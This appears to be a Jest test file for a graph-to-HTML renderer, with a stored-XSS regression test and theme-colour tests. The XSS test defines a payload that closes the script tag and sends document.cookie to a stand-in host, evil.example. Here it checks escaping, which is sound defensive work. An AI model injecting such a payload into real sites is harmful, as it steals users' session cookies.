import { graphHtml } from './graphHtml'
import { lightColors, darkColors } from '../theme/tokens'

// Regression test for a stored-XSS finding: node/edge labels come from LLM
// extraction over uploaded-document content with no character filtering
// server-side, and JSON.stringify does not escape "/" — embedding that JSON
// unescaped into a <script> tag let a label containing "</script>" close the
// tag early and inject arbitrary HTML/script into the WebView.
describe('graphHtml XSS escaping', () => {
  const malicious = "</script><script>fetch('https://evil.example/steal?c='+document.cookie)</script>"

  function buildHtml(label: string) {
    return graphHtml(
      { nodes: [{ id: 'a', label, source_count: 1 }], edges: [] },
      9,
    )
  }

  test('a label containing </script> never produces a literal </script> outside the real closing tag', () => {
    const html = buildHtml(malicious)
    // The HTML has exactly one legitimate closing </script> tag (for the
    // graph's own inline script). If escaping is broken, the malicious
    // label injects a second one earlier in the document.
    const closingTagCount = (html.match(/<\/script>/g) || []).length
    expect(closingTagCount).toBe(1)
  })

  test('the escaped payload still round-trips to the exact original label at runtime', () => {
    const html = buildHtml(malicious)
    const match = html.match(/var DATA = (.+);\n/)
    expect(match).not.toBeNull()
    // Mirrors what the browser/WebView actually does: the < escape
    // sequences are resolved by the JS engine when the script tag parses,
    // long before any JSON parsing happens.
    // eslint-disable-next-line no-eval
    const data = eval(`(${match![1]})`)
    expect(data.nodes[0].label).toBe(malicious)
  })

  test('a benign label is unaffected', () => {
    const html = buildHtml('Refund Policy')
    expect(html).toContain('Refund Policy')
  })

  test('includes a restrictive CSP meta tag as defense-in-depth', () => {
    const html = buildHtml('Refund Policy')
    expect(html).toMatch(/Content-Security-Policy.*default-src 'none'/)
  })
})

describe('graphHtml theming', () => {
  const graph = { nodes: [{ id: 'a', label: 'Refund Policy', source_count: 1 }], edges: [] }

  test('defaults to the light palette when no theme is passed', () => {
    const html = graphHtml(graph, 9)
    expect(html).toContain(`background: ${lightColors.surface}`)
    expect(html).toContain(`fill: ${lightColors.ink}`)
  })

  test('renders dark surfaces and text when given the dark palette', () => {
    const html = graphHtml(graph, 9, '', darkColors)
    expect(html).toContain(`background: ${darkColors.surface}`)
    expect(html).toContain(`fill: ${darkColors.ink}`)
    expect(html).not.toContain(`background: ${lightColors.surface}`)
  })

  test('brand node/focus colours are identical across themes', () => {
    const light = graphHtml(graph, 9, '', lightColors)
    const dark = graphHtml(graph, 9, '', darkColors)
    for (const html of [light, dark]) {
      expect(html).toContain(`fill: ${lightColors.indigo}`)
      expect(html).toContain(`stroke: ${lightColors.pink}`)
    }
  })
})
